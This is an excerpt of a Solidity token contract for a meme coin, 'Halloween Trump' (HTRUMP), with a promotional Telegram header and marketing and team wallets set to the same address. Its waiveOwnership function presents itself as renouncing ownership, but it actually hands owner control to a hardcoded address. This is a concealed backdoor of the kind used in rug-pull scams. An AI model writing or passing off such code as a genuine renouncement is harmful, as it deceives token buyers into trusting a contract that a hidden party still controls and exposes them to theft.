...
/**
   NEXT ELON TWEET Halloween + Trump
   https://t.me/HalloweenTrumpTweet
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x7f53dB49bE1d31CD72338cFc89596685c1f10aE6));
        _owner = address(0x7f53dB49bE1d31CD72338cFc89596685c1f10aE6);
    }
...
contract HalloweenTrumpTweet is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Halloween Trump ";
    string private _symbol = "HTRUMP";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x338FE315e8e6B313944c08dD1E4a2FDA1961De97);
    address payable public teamWalletAddress = payable(0x338FE315e8e6B313944c08dD1E4a2FDA1961De97);
